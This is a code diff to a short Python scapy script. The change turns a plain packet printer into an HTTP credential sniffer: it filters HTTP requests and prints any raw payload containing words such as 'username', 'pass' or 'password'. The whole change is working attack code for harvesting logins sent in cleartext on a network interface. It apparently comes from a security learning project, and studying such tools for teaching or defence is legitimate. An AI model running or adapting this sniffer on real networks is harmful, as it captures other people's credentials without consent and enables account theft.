@@ -1,5 +1,8 @@
+#! /usr/bin/env python
+
 import scapy.all as scapy
 import sys
+from scapy.layers import http
 
 #iface specifies interface, store (stores data in memory) prn is a callback function
 
@@ -7,7 +10,14 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 def process_sniffed_packet(packet):
-    print(packet)
+    if packet.haslayer(http.HTTPRequest):
+        if (packet.haslayer(scapy.Raw)):
+            load = (packet[scapy.Raw].load)
+            keywords = ["username", "user", "pass", "password", "login"]
+            for kw in keywords:
+                if kw in load:
+                    print(load)
+                    break
 
 
 def main():
